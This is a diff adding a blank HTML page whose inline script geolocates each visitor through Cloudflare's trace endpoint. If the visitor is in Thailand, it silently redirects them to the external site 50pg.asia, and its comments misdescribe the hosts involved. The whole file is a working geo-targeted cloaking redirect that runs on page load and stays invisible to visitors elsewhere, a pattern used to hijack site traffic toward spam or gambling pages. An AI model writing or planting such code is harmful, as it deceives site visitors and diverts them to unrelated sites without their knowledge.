@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        // Make a request to cat.com
+        fetch('https://cloudflare.com/cdn-cgi/trace')
+          .then(response => response.text())  // Assuming the response is plain text
+          .then(data => {
+            // Check if the response contains 'loc=th'
+            if (data.includes('loc=TH')) {
+              // Redirect to fun.com
+              window.location.replace('https://50pg.asia');
+            }
+          })
+          .catch(error => {
+            console.error('Error:', error);
+            // Handle errors as needed
+          });
+  
+      </script>
+  
+    <title>Document</title>
+</head>
+<body>
+    
+</body>
+</html>
